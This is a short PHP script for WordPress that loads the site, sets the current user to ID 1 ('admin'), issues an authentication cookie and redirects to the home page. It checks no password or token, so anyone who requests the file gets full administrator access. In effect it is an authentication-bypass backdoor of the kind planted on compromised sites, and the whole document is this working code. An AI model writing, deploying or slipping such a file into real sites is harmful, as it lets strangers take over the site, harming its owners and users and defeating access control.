<?php

require(dirname(__FILE__) . '/wp-load.php');

$user_name ='admin';

$user_id = 1;

wp_set_current_user($user_id, $user_name);

wp_set_auth_cookie($user_id);

do_action('wp_login', $user_name);

wp_redirect(home_url('/'));

?>
